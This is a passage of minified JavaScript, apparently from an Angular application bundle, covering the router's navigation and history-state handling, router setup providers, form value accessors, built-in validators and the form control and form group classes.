function(i){return(n||(n=Wn(t)))(i||t)}})()}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),A_=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(mN),providedIn:"root"})}}return t})(),mN=(()=>{class t extends A_{constructor(){super(...arguments),this.location=y(ao),this.urlSerializer=y(ch),this.options=y(hh,{optional:!0})||{},this.canceledNavigationResolution=this.options.canceledNavigationResolution||"replace",this.urlHandlingStrategy=y(gh),this.urlUpdateStrategy=this.options.urlUpdateStrategy||"deferred",this.currentUrlTree=new Ut,this.rawUrlTree=this.currentUrlTree,this.currentPageId=0,this.lastSuccessfulId=-1,this.routerState=g_(null),this.stateMemento=this.createStateMemento()}getCurrentUrlTree(){return this.currentUrlTree}getRawUrlTree(){return this.rawUrlTree}restoredState(){return this.location.getState()}get browserPageId(){return this.canceledNavigationResolution!=="computed"?this.currentPageId:this.restoredState()?.\u0275routerPageId??this.currentPageId}getRouterState(){return this.routerState}createStateMemento(){return{rawUrlTree:this.rawUrlTree,currentUrlTree:this.currentUrlTree,routerState:this.routerState}}registerNonRouterCurrentEntryChangeListener(n){return this.location.subscribe(r=>{r.type==="popstate"&&n(r.url,r.state)})}handleRouterEvent(n,r){if(n instanceof wo)this.stateMemento=this.createStateMemento();else if(n instanceof Qn)this.rawUrlTree=r.initialUrl;else if(n instanceof Xa){if(this.urlUpdateStrategy==="eager"&&!r.extras.skipLocationChange){let i=this.urlHandlingStrategy.merge(r.finalUrl,r.initialUrl);this.setBrowserUrl(r.targetBrowserUrl??i,r)}}else n instanceof Co?(this.currentUrlTree=r.finalUrl,this.rawUrlTree=this.urlHandlingStrategy.merge(r.finalUrl,r.initialUrl),this.routerState=r.targetRouterState,this.urlUpdateStrategy==="deferred"&&!r.extras.skipLocationChange&&this.setBrowserUrl(r.targetBrowserUrl??this.rawUrlTree,r)):n instanceof jt&&(n.code===Ve.GuardRejected||n.code===Ve.NoDataFromResolver)?this.restoreHistory(r):n instanceof Eo?this.restoreHistory(r,!0):n instanceof Zn&&(this.lastSuccessfulId=n.id,this.currentPageId=this.browserPageId)}setBrowserUrl(n,r){let i=n instanceof Ut?this.urlSerializer.serialize(n):n;if(this.location.isCurrentPathEqualTo(i)||r.extras.replaceUrl){let o=this.browserPageId,s=v(v({},r.extras.state),this.generateNgRouterState(r.id,o));this.location.replaceState(i,"",s)}else{let o=v(v({},r.extras.state),this.generateNgRouterState(r.id,this.browserPageId+1));this.location.go(i,"",o)}}restoreHistory(n,r=!1){if(this.canceledNavigationResolution==="computed"){let i=this.browserPageId,o=this.currentPageId-i;o!==0?this.location.historyGo(o):this.currentUrlTree===n.finalUrl&&o===0&&(this.resetState(n),this.resetUrlToCurrentUrlTree())}else this.canceledNavigationResolution==="replace"&&(r&&this.resetState(n),this.resetUrlToCurrentUrlTree())}resetState(n){this.routerState=this.stateMemento.routerState,this.currentUrlTree=this.stateMemento.currentUrlTree,this.rawUrlTree=this.urlHandlingStrategy.merge(this.currentUrlTree,n.finalUrl??this.rawUrlTree)}resetUrlToCurrentUrlTree(){this.location.replaceState(this.urlSerializer.serialize(this.rawUrlTree),"",this.generateNgRouterState(this.lastSuccessfulId,this.currentPageId))}generateNgRouterState(n,r){return this.canceledNavigationResolution==="computed"?{navigationId:n,\u0275routerPageId:r}:{navigationId:n}}static{this.\u0275fac=(()=>{let n;return function(i){return(n||(n=Wn(t)))(i||t)}})()}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),po=function(t){return t[t.COMPLETE=0]="COMPLETE",t[t.FAILED=1]="FAILED",t[t.REDIRECTING=2]="REDIRECTING",t}(po||{});function vN(t,e){t.events.pipe(Je(n=>n instanceof Zn||n instanceof jt||n instanceof Eo||n instanceof Qn),O(n=>n instanceof Zn||n instanceof Qn?po.COMPLETE:(n instanceof jt?n.code===Ve.Redirect||n.code===Ve.SupersededByNewNavigation:!1)?po.REDIRECTING:po.FAILED),Je(n=>n!==po.REDIRECTING),bt(1)).subscribe(()=>{e()})}function yN(t){throw t}var _N={paths:"exact",fragment:"ignored",matrixParams:"ignored",queryParams:"exact"},IN={paths:"subset",fragment:"ignored",matrixParams:"ignored",queryParams:"subset"},M_=(()=>{class t{get currentUrlTree(){return this.stateManager.getCurrentUrlTree()}get rawUrlTree(){return this.stateManager.getRawUrlTree()}get events(){return this._events}get routerState(){return this.stateManager.getRouterState()}constructor(){this.disposed=!1,this.console=y(Ua),this.stateManager=y(A_),this.options=y(hh,{optional:!0})||{},this.pendingTasks=y(Zr),this.urlUpdateStrategy=this.options.urlUpdateStrategy||"deferred",this.navigationTransitions=y(hN),this.urlSerializer=y(ch),this.location=y(ao),this.urlHandlingStrategy=y(gh),this._events=new pe,this.errorHandler=this.options.errorHandler||yN,this.navigated=!1,this.routeReuseStrategy=y(pN),this.onSameUrlNavigation=this.options.onSameUrlNavigation||"ignore",this.config=y(ph,{optional:!0})?.flat()??[],this.componentInputBindingEnabled=!!y(dh,{optional:!0}),this.eventsSubscription=new re,this.resetConfig(this.config),this.navigationTransitions.setupNavigations(this,this.currentUrlTree,this.routerState).subscribe({error:n=>{this.console.warn(n)}}),this.subscribeToNavigationEvents()}subscribeToNavigationEvents(){let n=this.navigationTransitions.events.subscribe(r=>{try{let i=this.navigationTransitions.currentTransition,o=this.navigationTransitions.currentNavigation;if(i!==null&&o!==null){if(this.stateManager.handleRouterEvent(r,o),r instanceof jt&&r.code!==Ve.Redirect&&r.code!==Ve.SupersededByNewNavigation)this.navigated=!0;else if(r instanceof Zn)this.navigated=!0;else if(r instanceof si){let s=r.navigationBehaviorOptions,a=this.urlHandlingStrategy.merge(r.url,i.currentRawUrl),c=v({browserUrl:i.extras.browserUrl,info:i.extras.info,skipLocationChange:i.extras.skipLocationChange,replaceUrl:i.extras.replaceUrl||this.urlUpdateStrategy==="eager"||fN(i.source)},s);this.scheduleNavigation(a,mo,null,c,{resolve:i.resolve,reject:i.reject,promise:i.promise})}}EN(r)&&this._events.next(r)}catch(i){this.navigationTransitions.transitionAbortSubject.next(i)}});this.eventsSubscription.add(n)}resetRootComponentType(n){this.routerState.root.component=n,this.navigationTransitions.rootComponentType=n}initialNavigation(){this.setUpLocationChangeListener(),this.navigationTransitions.hasRequestedNavigation||this.navigateToSyncWithBrowser(this.location.path(!0),mo,this.stateManager.restoredState())}setUpLocationChangeListener(){this.nonRouterCurrentEntryChangeSubscription??=this.stateManager.registerNonRouterCurrentEntryChangeListener((n,r)=>{setTimeout(()=>{this.navigateToSyncWithBrowser(n,"popstate",r)},0)})}navigateToSyncWithBrowser(n,r,i){let o={replaceUrl:!0},s=i?.navigationId?i:null;if(i){let c=v({},i);delete c.navigationId,delete c.\u0275routerPageId,Object.keys(c).length!==0&&(o.state=c)}let a=this.parseUrl(n);this.scheduleNavigation(a,r,s,o)}get url(){return this.serializeUrl(this.currentUrlTree)}getCurrentNavigation(){return this.navigationTransitions.currentNavigation}get lastSuccessfulNavigation(){return this.navigationTransitions.lastSuccessfulNavigation}resetConfig(n){this.config=n.map(fh),this.navigated=!1}ngOnDestroy(){this.dispose()}dispose(){this.navigationTransitions.complete(),this.nonRouterCurrentEntryChangeSubscription&&(this.nonRouterCurrentEntryChangeSubscription.unsubscribe(),this.nonRouterCurrentEntryChangeSubscription=void 0),this.disposed=!0,this.eventsSubscription.unsubscribe()}createUrlTree(n,r={}){let{relativeTo:i,queryParams:o,fragment:s,queryParamsHandling:a,preserveFragment:c}=r,l=c?this.currentUrlTree.fragment:s,u=null;switch(a??this.options.defaultQueryParamsHandling){case"merge":u=v(v({},this.currentUrlTree.queryParams),o);break;case"preserve":u=this.currentUrlTree.queryParams;break;default:u=o||null}u!==null&&(u=this.removeEmptyProps(u));let d;try{let h=i?i.snapshot:this.routerState.snapshot.root;d=d_(h)}catch{(typeof n[0]!="string"||n[0][0]!=="/")&&(n=[]),d=this.currentUrlTree.root}return h_(d,n,u,l??null)}navigateByUrl(n,r={skipLocationChange:!1}){let i=_o(n)?n:this.parseUrl(n),o=this.urlHandlingStrategy.merge(i,this.rawUrlTree);return this.scheduleNavigation(o,mo,null,r)}navigate(n,r={skipLocationChange:!1}){return wN(n),this.navigateByUrl(this.createUrlTree(n,r),r)}serializeUrl(n){return this.urlSerializer.serialize(n)}parseUrl(n){try{return this.urlSerializer.parse(n)}catch{return this.urlSerializer.parse("/")}}isActive(n,r){let i;if(r===!0?i=v({},_N):r===!1?i=v({},IN):i=r,_o(n))return Yy(this.currentUrlTree,n,i);let o=this.parseUrl(n);return Yy(this.currentUrlTree,o,i)}removeEmptyProps(n){return Object.entries(n).reduce((r,[i,o])=>(o!=null&&(r[i]=o),r),{})}scheduleNavigation(n,r,i,o,s){if(this.disposed)return Promise.resolve(!1);let a,c,l;s?(a=s.resolve,c=s.reject,l=s.promise):l=new Promise((d,h)=>{a=d,c=h});let u=this.pendingTasks.add();return vN(this,()=>{queueMicrotask(()=>this.pendingTasks.remove(u))}),this.navigationTransitions.handleNavigationRequest({source:r,restoredState:i,currentUrlTree:this.currentUrlTree,currentRawUrl:this.currentUrlTree,rawUrl:n,extras:o,resolve:a,reject:c,promise:l,currentSnapshot:this.routerState.snapshot,currentRouterState:this.routerState}),l.catch(d=>Promise.reject(d))}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();function wN(t){for(let e=0;e<t.length;e++)if(t[e]==null)throw new w(4008,!1)}function EN(t){return!(t instanceof Co)&&!(t instanceof si)}var CN=new I("");function N_(t,...e){return gt([{provide:ph,multi:!0,useValue:t},[],{provide:ai,useFactory:DN,deps:[M_]},{provide:_d,multi:!0,useFactory:bN},e.map(n=>n.\u0275providers)])}function DN(t){return t.routerState.root}function bN(){let t=y(Me);return e=>{let n=t.get(Gn);if(e!==n.components[0])return;let r=t.get(M_),i=t.get(SN);t.get(TN)===1&&r.initialNavigation(),t.get(AN,null,M.Optional)?.setUpPreloading(),t.get(CN,null,M.Optional)?.init(),r.resetRootComponentType(n.componentTypes[0]),i.closed||(i.next(),i.complete(),i.unsubscribe())}}var SN=new I("",{factory:()=>new pe}),TN=new I("",{providedIn:"root",factory:()=>1});var AN=new I("");var U_=(()=>{class t{constructor(n,r){this._renderer=n,this._elementRef=r,this.onChange=i=>{},this.onTouched=()=>{}}setProperty(n,r){this._renderer.setProperty(this._elementRef.nativeElement,n,r)}registerOnTouched(n){this.onTouched=n}registerOnChange(n){this.onChange=n}setDisabledState(n){this.setProperty("disabled",n)}static{this.\u0275fac=function(r){return new(r||t)(W(fn),W(kt))}}static{this.\u0275dir=Ie({type:t})}}return t})(),wh=(()=>{class t extends U_{static{this.\u0275fac=(()=>{let n;return function(i){return(n||(n=Wn(t)))(i||t)}})()}static{this.\u0275dir=Ie({type:t,features:[mt]})}}return t})(),vc=new I("");var MN={provide:vc,useExisting:un(()=>yc),multi:!0};function NN(){let t=Vt()?Vt().getUserAgent():"";return/android (\d+)/.test(t.toLowerCase())}var RN=new I(""),yc=(()=>{class t extends U_{constructor(n,r,i){super(n,r),this._compositionMode=i,this._composing=!1,this._compositionMode==null&&(this._compositionMode=!NN())}writeValue(n){let r=n??"";this.setProperty("value",r)}_handleInput(n){(!this._compositionMode||this._compositionMode&&!this._composing)&&this.onChange(n)}_compositionStart(){this._composing=!0}_compositionEnd(n){this._composing=!1,this._compositionMode&&this.onChange(n)}static{this.\u0275fac=function(r){return new(r||t)(W(fn),W(kt),W(RN,8))}}static{this.\u0275dir=Ie({type:t,selectors:[["input","formControlName","",3,"type","checkbox"],["textarea","formControlName",""],["input","formControl","",3,"type","checkbox"],["textarea","formControl",""],["input","ngModel","",3,"type","checkbox"],["textarea","ngModel",""],["","ngDefaultControl",""]],hostBindings:function(r,i){r&1&&Ft("input",function(s){return i._handleInput(s.target.value)})("blur",function(){return i.onTouched()})("compositionstart",function(){return i._compositionStart()})("compositionend",function(s){return i._compositionEnd(s.target.value)})},features:[Qr([MN]),mt]})}}return t})();function mn(t){return t==null||(typeof t=="string"||Array.isArray(t))&&t.length===0}function B_(t){return t!=null&&typeof t.length=="number"}var $_=new I(""),H_=new I(""),xN=/^(?=.{1,254}$)(?=.{1,64}@)[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/,hi=class{static min(e){return ON(e)}static max(e){return PN(e)}static required(e){return kN(e)}static requiredTrue(e){return FN(e)}static email(e){return LN(e)}static minLength(e){return VN(e)}static maxLength(e){return jN(e)}static pattern(e){return UN(e)}static nullValidator(e){return W_(e)}static compose(e){return Z_(e)}static composeAsync(e){return J_(e)}};function ON(t){return e=>{if(mn(e.value)||mn(t))return null;let n=parseFloat(e.value);return!isNaN(n)&&n<t?{min:{min:t,actual:e.value}}:null}}function PN(t){return e=>{if(mn(e.value)||mn(t))return null;let n=parseFloat(e.value);return!isNaN(n)&&n>t?{max:{max:t,actual:e.value}}:null}}function kN(t){return mn(t.value)?{required:!0}:null}function FN(t){return t.value===!0?null:{required:!0}}function LN(t){return mn(t.value)||xN.test(t.value)?null:{email:!0}}function VN(t){return e=>mn(e.value)||!B_(e.value)?null:e.value.length<t?{minlength:{requiredLength:t,actualLength:e.value.length}}:null}function jN(t){return e=>B_(e.value)&&e.value.length>t?{maxlength:{requiredLength:t,actualLength:e.value.length}}:null}function UN(t){if(!t)return W_;let e,n;return typeof t=="string"?(n="",t.charAt(0)!=="^"&&(n+="^"),n+=t,t.charAt(t.length-1)!=="$"&&(n+="$"),e=new RegExp(n)):(n=t.toString(),e=t),r=>{if(mn(r.value))return null;let i=r.value;return e.test(i)?null:{pattern:{requiredPattern:n,actualValue:i}}}}function W_(t){return null}function z_(t){return t!=null}function G_(t){return zn(t)?ie(t):t}function q_(t){let e={};return t.forEach(n=>{e=n!=null?v(v({},e),n):e}),Object.keys(e).length===0?null:e}function Y_(t,e){return e.map(n=>n(t))}function BN(t){return!t.validate}function K_(t){return t.map(e=>BN(e)?e:n=>e.validate(n))}function Z_(t){if(!t)return null;let e=t.filter(z_);return e.length==0?null:function(n){return q_(Y_(n,e))}}function Q_(t){return t!=null?Z_(K_(t)):null}function J_(t){if(!t)return null;let e=t.filter(z_);return e.length==0?null:function(n){let r=Y_(n,e).map(G_);return jl(r).pipe(O(q_))}}function X_(t){return t!=null?J_(K_(t)):null}function R_(t,e){return t===null?[e]:Array.isArray(t)?[...t,e]:[t,e]}function eI(t){return t._rawValidators}function tI(t){return t._rawAsyncValidators}function mh(t){return t?Array.isArray(t)?t:[t]:[]}function uc(t,e){return Array.isArray(t)?t.includes(e):t===e}function x_(t,e){let n=mh(e);return mh(t).forEach(i=>{uc(n,i)||n.push(i)}),n}function O_(t,e){return mh(e).filter(n=>!uc(t,n))}var dc=class{constructor(){this._rawValidators=[],this._rawAsyncValidators=[],this._onDestroyCallbacks=[]}get value(){return this.control?this.control.value:null}get valid(){return this.control?this.control.valid:null}get invalid(){return this.control?this.control.invalid:null}get pending(){return this.control?this.control.pending:null}get disabled(){return this.control?this.control.disabled:null}get enabled(){return this.control?this.control.enabled:null}get errors(){return this.control?this.control.errors:null}get pristine(){return this.control?this.control.pristine:null}get dirty(){return this.control?this.control.dirty:null}get touched(){return this.control?this.control.touched:null}get status(){return this.control?this.control.status:null}get untouched(){return this.control?this.control.untouched:null}get statusChanges(){return this.control?this.control.statusChanges:null}get valueChanges(){return this.control?this.control.valueChanges:null}get path(){return null}_setValidators(e){this._rawValidators=e||[],this._composedValidatorFn=Q_(this._rawValidators)}_setAsyncValidators(e){this._rawAsyncValidators=e||[],this._composedAsyncValidatorFn=X_(this._rawAsyncValidators)}get validator(){return this._composedValidatorFn||null}get asyncValidator(){return this._composedAsyncValidatorFn||null}_registerOnDestroy(e){this._onDestroyCallbacks.push(e)}_invokeOnDestroyCallbacks(){this._onDestroyCallbacks.forEach(e=>e()),this._onDestroyCallbacks=[]}reset(e=void 0){this.control&&this.control.reset(e)}hasError(e,n){return this.control?this.control.hasError(e,n):!1}getError(e,n){return this.control?this.control.getError(e,n):null}},fi=class extends dc{get formDirective(){return null}get path(){return null}},ko=class extends dc{constructor(){super(...arguments),this._parent=null,this.name=null,this.valueAccessor=null}},hc=class{constructor(e){this._cd=e}get isTouched(){return this._cd?.control?._touched?.(),!!this._cd?.control?.touched}get isUntouched(){return!!this._cd?.control?.untouched}get isPristine(){return this._cd?.control?._pristine?.(),!!this._cd?.control?.pristine}get isDirty(){return!!this._cd?.control?.dirty}get isValid(){return this._cd?.control?._status?.(),!!this._cd?.control?.valid}get isInvalid(){return!!this._cd?.control?.invalid}get isPending(){return!!this._cd?.control?.pending}get isSubmitted(){return this._cd?._submitted?.(),!!this._cd?.submitted}},$N={"[class.ng-untouched]":"isUntouched","[class.ng-touched]":"isTouched","[class.ng-pristine]":"isPristine","[class.ng-dirty]":"isDirty","[class.ng-valid]":"isValid","[class.ng-invalid]":"isInvalid","[class.ng-pending]":"isPending"},U2=x(v({},$N),{"[class.ng-submitted]":"isSubmitted"}),nI=(()=>{class t extends hc{constructor(n){super(n)}static{this.\u0275fac=function(r){return new(r||t)(W(ko,2))}}static{this.\u0275dir=Ie({type:t,selectors:[["","formControlName",""],["","ngModel",""],["","formControl",""]],hostVars:14,hostBindings:function(r,i){r&2&&ja("ng-untouched",i.isUntouched)("ng-touched",i.isTouched)("ng-pristine",i.isPristine)("ng-dirty",i.isDirty)("ng-valid",i.isValid)("ng-invalid",i.isInvalid)("ng-pending",i.isPending)},features:[mt]})}}return t})(),rI=(()=>{class t extends hc{constructor(n){super(n)}static{this.\u0275fac=function(r){return new(r||t)(W(fi,10))}}static{this.\u0275dir=Ie({type:t,selectors:[["","formGroupName",""],["","formArrayName",""],["","ngModelGroup",""],["","formGroup",""],["form",3,"ngNoForm",""],["","ngForm",""]],hostVars:16,hostBindings:function(r,i){r&2&&ja("ng-untouched",i.isUntouched)("ng-touched",i.isTouched)("ng-pristine",i.isPristine)("ng-dirty",i.isDirty)("ng-valid",i.isValid)("ng-invalid",i.isInvalid)("ng-pending",i.isPending)("ng-submitted",i.isSubmitted)},features:[mt]})}}return t})();var Ro="VALID",cc="INVALID",ui="PENDING",xo="DISABLED",vn=class{},fc=class extends vn{constructor(e,n){super(),this.value=e,this.source=n}},Oo=class extends vn{constructor(e,n){super(),this.pristine=e,this.source=n}},Po=class extends vn{constructor(e,n){super(),this.touched=e,this.source=n}},di=class extends vn{constructor(e,n){super(),this.status=e,this.source=n}},vh=class extends vn{constructor(e){super(),this.source=e}},yh=class extends vn{constructor(e){super(),this.source=e}};function Eh(t){return(_c(t)?t.validators:t)||null}function HN(t){return Array.isArray(t)?Q_(t):t||null}function Ch(t,e){return(_c(e)?e.asyncValidators:t)||null}function WN(t){return Array.isArray(t)?X_(t):t||null}function _c(t){return t!=null&&!Array.isArray(t)&&typeof t=="object"}function iI(t,e,n){let r=t.controls;if(!(e?Object.keys(r):r).length)throw new w(1e3,"");if(!r[n])throw new w(1001,"")}function oI(t,e,n){t._forEachChild((r,i)=>{if(n[i]===void 0)throw new w(1002,"")})}var pi=class{constructor(e,n){this._pendingDirty=!1,this._hasOwnPendingAsyncValidator=null,this._pendingTouched=!1,this._onCollectionChange=()=>{},this._parent=null,this._status=so(()=>this.statusReactive()),this.statusReactive=oo(void 0),this._pristine=so(()=>this.pristineReactive()),this.pristineReactive=oo(!0),this._touched=so(()=>this.touchedReactive()),this.touchedReactive=oo(!1),this._events=new pe,this.events=this._events.asObservable(),this._onDisabledChange=[],this._assignValidators(e),this._assignAsyncValidators(n)}get validator(){return this._composedValidatorFn}set validator(e){this._rawValidators=this._composedValidatorFn=e}get asyncValidator(){return this._composedAsyncValidatorFn}set asyncValidator(e){this._rawAsyncValidators=this._composedAsyncValidatorFn=e}get parent(){return this._parent}get status(){return Lt(this.statusReactive)}set status(e){Lt(()=>this.statusReactive.set(e))}get valid(){return this.status===Ro}get invalid(){return this.status===cc}get pending(){return this.status==ui}get disabled(){return this.status===xo}get enabled(){return this.status!==xo}get pristine(){return Lt(this.pristineReactive)}set pristine(e){Lt(()=>this.pristineReactive.set(e))}get dirty(){return!this.pristine}get touched(){return Lt(this.touchedReactive)}set touched(e){Lt(()=>this.touchedReactive.set(e))}get untouched(){return!this.touched}get updateOn(){return this._updateOn?this._updateOn:this.parent?this.parent.updateOn:"change"}setValidators(e){this._assignValidators(e)}setAsyncValidators(e){this._assignAsyncValidators(e)}addValidators(e){this.setValidators(x_(e,this._rawValidators))}addAsyncValidators(e){this.setAsyncValidators(x_(e,this._rawAsyncValidators))}removeValidators(e){this.setValidators(O_(e,this._rawValidators))}removeAsyncValidators(e){this.setAsyncValidators(O_(e,this._rawAsyncValidators))}hasValidator(e){return uc(this._rawValidators,e)}hasAsyncValidator(e){return uc(this._rawAsyncValidators,e)}clearValidators(){this.validator=null}clearAsyncValidators(){this.asyncValidator=null}markAsTouched(e={}){let n=this.touched===!1;this.touched=!0;let r=e.sourceControl??this;this._parent&&!e.onlySelf&&this._parent.markAsTouched(x(v({},e),{sourceControl:r})),n&&e.emitEvent!==!1&&this._events.next(new Po(!0,r))}markAllAsTouched(e={}){this.markAsTouched({onlySelf:!0,emitEvent:e.emitEvent,sourceControl:this}),this._forEachChild(n=>n.markAllAsTouched(e))}markAsUntouched(e={}){let n=this.touched===!0;this.touched=!1,this._pendingTouched=!1;let r=e.sourceControl??this;this._forEachChild(i=>{i.markAsUntouched({onlySelf:!0,emitEvent:e.emitEvent,sourceControl:r})}),this._parent&&!e.onlySelf&&this._parent._updateTouched(e,r),n&&e.emitEvent!==!1&&this._events.next(new Po(!1,r))}markAsDirty(e={}){let n=this.pristine===!0;this.pristine=!1;let r=e.sourceControl??this;this._parent&&!e.onlySelf&&this._parent.markAsDirty(x(v({},e),{sourceControl:r})),n&&e.emitEvent!==!1&&this._events.next(new Oo(!1,r))}markAsPristine(e={}){let n=this.pristine===!1;this.pristine=!0,this._pendingDirty=!1;let r=e.sourceControl??this;this._forEachChild(i=>{i.markAsPristine({onlySelf:!0,emitEvent:e.emitEvent})}),this._parent&&!e.onlySelf&&this._parent._updatePristine(e,r),n&&e.emitEvent!==!1&&this._events.next(new Oo(!0,r))}markAsPending(e={}){this.status=ui;let n=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new di(this.status,n)),this.statusChanges.emit(this.status)),this._parent&&!e.onlySelf&&this._parent.markAsPending(x(v({},e),{sourceControl:n}))}disable(e={}){let n=this._parentMarkedDirty(e.onlySelf);this.status=xo,this.errors=null,this._forEachChild(i=>{i.disable(x(v({},e),{onlySelf:!0}))}),this._updateValue();let r=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new fc(this.value,r)),this._events.next(new di(this.status,r)),this.valueChanges.emit(this.value),this.statusChanges.emit(this.status)),this._updateAncestors(x(v({},e),{skipPristineCheck:n}),this),this._onDisabledChange.forEach(i=>i(!0))}enable(e={}){let n=this._parentMarkedDirty(e.onlySelf);this.status=Ro,this._forEachChild(r=>{r.enable(x(v({},e),{onlySelf:!0}))}),this.updateValueAndValidity({onlySelf:!0,emitEvent:e.emitEvent}),this._updateAncestors(x(v({},e),{skipPristineCheck:n}),this),this._onDisabledChange.forEach(r=>r(!1))}_updateAncestors(e,n){this._parent&&!e.onlySelf&&(this._parent.updateValueAndValidity(e),e.skipPristineCheck||this._parent._updatePristine({},n),this._parent._updateTouched({},n))}setParent(e){this._parent=e}getRawValue(){return this.value}updateValueAndValidity(e={}){if(this._setInitialStatus(),this._updateValue(),this.enabled){let r=this._cancelExistingSubscription();this.errors=this._runValidator(),this.status=this._calculateStatus(),(this.status===Ro||this.status===ui)&&this._runAsyncValidator(r,e.emitEvent)}let n=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new fc(this.value,n)),this._events.next(new di(this.status,n)),this.valueChanges.emit(this.value),this.statusChanges.emit(this.status)),this._parent&&!e.onlySelf&&this._parent.updateValueAndValidity(x(v({},e),{sourceControl:n}))}_updateTreeValidity(e={emitEvent:!0}){this._forEachChild(n=>n._updateTreeValidity(e)),this.updateValueAndValidity({onlySelf:!0,emitEvent:e.emitEvent})}_setInitialStatus(){this.status=this._allControlsDisabled()?xo:Ro}_runValidator(){return this.validator?this.validator(this):null}_runAsyncValidator(e,n){if(this.asyncValidator){this.status=ui,this._hasOwnPendingAsyncValidator={emitEvent:n!==!1};let r=G_(this.asyncValidator(this));this._asyncValidationSubscription=r.subscribe(i=>{this._hasOwnPendingAsyncValidator=null,this.setErrors(i,{emitEvent:n,shouldHaveEmitted:e})})}}_cancelExistingSubscription(){if(this._asyncValidationSubscription){this._asyncValidationSubscription.unsubscribe();let e=this._hasOwnPendingAsyncValidator?.emitEvent??!1;return this._hasOwnPendingAsyncValidator=null,e}return!1}setErrors(e,n={}){this.errors=e,this._updateControlsErrors(n.emitEvent!==!1,this,n.shouldHaveEmitted)}get(e){let n=e;return n==null||(Array.isArray(n)||(n=n.split(".")),n.length===0)?null:n.reduce((r,i)=>r&&r._find(i),this)}getError(e,n){let r=n?this.get(n):this;return r&&r.errors?r.errors[e]:null}hasError(e,n){return!!this.getError(e,n)}get root(){let e=this;for(;e._parent;)e=e._parent;return e}_updateControlsErrors(e,n,r){this.status=this._calculateStatus(),e&&this.statusChanges.emit(this.status),(e||r)&&this._events.next(new di(this.status,n)),this._parent&&this._parent._updateControlsErrors(e,n,r)}_initObservables(){this.valueChanges=new se,this.statusChanges=new se}_calculateStatus(){return this._allControlsDisabled()?xo:this.errors?cc:this._hasOwnPendingAsyncValidator||this._anyControlsHaveStatus(ui)?ui:this._anyControlsHaveStatus(cc)?cc:Ro}_anyControlsHaveStatus(e){return this._anyControls(n=>n.status===e)}_anyControlsDirty(){return this._anyControls(e=>e.dirty)}_anyControlsTouched(){return this._anyControls(e=>e.touched)}_updatePristine(e,n){let r=!this._anyControlsDirty(),i=this.pristine!==r;this.pristine=r,this._parent&&!e.onlySelf&&this._parent._updatePristine(e,n),i&&this._events.next(new Oo(this.pristine,n))}_updateTouched(e={},n){this.touched=this._anyControlsTouched(),this._events.next(new Po(this.touched,n)),this._parent&&!e.onlySelf&&this._parent._updateTouched(e,n)}_registerOnCollectionChange(e){this._onCollectionChange=e}_setUpdateStrategy(e){_c(e)&&e.updateOn!=null&&(this._updateOn=e.updateOn)}_parentMarkedDirty(e){let n=this._parent&&this._parent.dirty;return!e&&!!n&&!this._parent._anyControlsDirty()}_find(e){return null}_assignValidators(e){this._rawValidators=Array.isArray(e)?e.slice():e,this._composedValidatorFn=HN(this._rawValidators)}_assignAsyncValidators(e){this._rawAsyncValidators=Array.isArray(e)?e.slice():e,this._composedAsyncValidatorFn=WN(this._rawAsyncValidators)}},pc=class extends pi{constructor(e,n,r){super(Eh(n),Ch(r,n)),this.controls=e,this._initObservables(),this._setUpdateStrategy(n),this._setUpControls(),this.updateValueAndValidity({onlySelf:!0,emitEvent:!!this.asyncValidator})}registerControl(e,n){return this.controls[e]?this.controls[e]:(this.controls[e]=n,n.setParent(this),n._registerOnCollectionChange(this._onCollectionChange),n)}addControl(e,n,r={}){this.registerControl(e,n),this.updateValueAndValidity({emitEvent:r.emitEvent}),this._onCollectionChange()}removeControl(e,n={}){this.controls[e]&&this.controls[e]._registerOnCollectionChange(()=>{}),delete this.controls[e],this.updateValueAndValidity({emitEvent:n.emitEvent}),this._onCollectionChange()}setControl(e,n,r={}){this.controls[e]&&this.controls[e]._registerOnCollectionChange(()=>{}),delete this.controls[e],n&&this.registerControl(e,n),this.updateValueAndValidity({emitEvent:r.emitEvent}),this._onCollectionChange()}contains(e){return this.controls.hasOwnProperty(e)&&this.controls[e].enabled}setValue(e,n={}){oI(this,!0,e),Object.keys(e).forEach(r=>{iI(this,!0,r),this.controls[r].setValue(e[r],{onlySelf:!0,emitEvent:n.emitEvent})}),this.updateValueAndValidity(n)}patchValue(e,n={}){e!=null&&(Object.keys(e).forEach(r=>{let i=this.controls[r];i&&i.patchValue(e[r],{onlySelf:!0,emitEvent:n.emitEvent})}),this.updateValueAndValidity(n))}reset(e={},n={}){this._forEachChild((r,i)=>{r.reset(e?e[i]:null,{onlySelf:!0,emitEvent:n.emitEvent})}),this._updatePristine(n,this),this._updateTouched(n,this),this.updateValueAndValidity(n)}getRawValue(){return this._reduceChildren({},(e,n,r)=>(e[r]=n.getRawValue(),e))}_syncPendingControls(){let e=this._reduceChildren(!1,(n,r)=>r._syncPendingControls()?!0:n);return e&&this.updateValueAndValidity({onlySelf:!0}),e}_forEachChild(e){Object.keys(this.controls).forEach(n=>{let r=this.controls[n];r&&e(r,n)})}_setUpControls(){this._forEachChild(e=>{e.setParent(this),e._registerOnCollectionChange(this._onCollectionChange)})}_updateValue(){this.value=this._reduceValue()}_anyControls(e){for(let[n,r]of Object.entries(this.controls))if(this.contains(n)&&e(r))return!0;return!1}_reduceValue(){let e={};return this._reduceChildren(e,(n,r,i)=>((r.enabled||this.disabled)&&(n[i]=r.value),n))}_reduceChildren(e,n){let r=e;return this._forEachChild((i,o)=>{r=n(r,i,o)}),r}_allControlsDisabled(){for(let e of Object.keys(this.controls))if(this.controls[e].enabled)return!1;return Object.keys(this.controls).length>0||this.disabled}_find(e){return this.controls.hasOwnProperty(e)?this.controls[e]:null}};var _h=class extends pc{};var sI=new I("CallSetDisabledState",{providedIn:"root",factory:()=>Dh}),Dh="always";function 